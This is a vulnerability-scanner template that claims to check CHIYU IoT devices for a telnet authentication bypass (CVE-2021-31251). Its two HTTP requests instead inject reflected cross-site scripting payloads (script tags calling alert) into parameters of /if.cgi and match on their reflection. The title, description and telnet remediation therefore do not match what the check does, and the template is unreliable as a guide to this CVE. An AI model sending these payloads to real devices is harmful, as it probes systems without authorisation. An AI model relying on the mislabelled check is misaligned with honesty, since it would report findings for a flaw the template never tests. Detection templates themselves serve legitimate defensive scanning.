id: CVE-2021-31251

info:
  name: Telnet Authentication Bypass in CHIYU IoT Devices
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    An authentication bypass in the telnet server in BF-430 and BF431 232/422 TCP/IP Converter, BF-450M, and SEMAC from CHIYU Technology Inc allows obtaining a privileged connection with the target device by supplying a specially malformed request. An attacker may force the remote telnet server to believe that the user has already authenticated.
  reference:
    - https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31251
    - https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks/#.YLqK1KhKguU
  remediation: |
    Ensure that the telnet service is either disabled or replaced with a more secure protocol like SSH. If telnet must be used, implement strong access controls and network segmentation to minimize exposure. Regularly update device firmware to patch known vulnerabilities.

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET /if.cgi?redirect=EmpRcd.htm&failure=fail.htm&type=user_data&creg=0&num=&EmployeeID=3&MarkID=3474&CardID=00000000&emp_id=&username=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Card_Valid=0&SY=2019&SM=11&SD=25&sy_h=15&sy_m=0&EY=2019&EM=11&ED=25&sy_h=15&sy_m=0&Activate=5&Usertype=0&group_list1=1&group_list2=0&group_list3=0&group_list4=0&Verify=1&Password=&Retype=&card=0&card=0&card=0&card=0&card=118&card=5&card=101&card=110 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "<script>alert\\(1\\)</script>"

  - raw:
      - |
        GET /if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "<script>alert\\(123\\)</script>"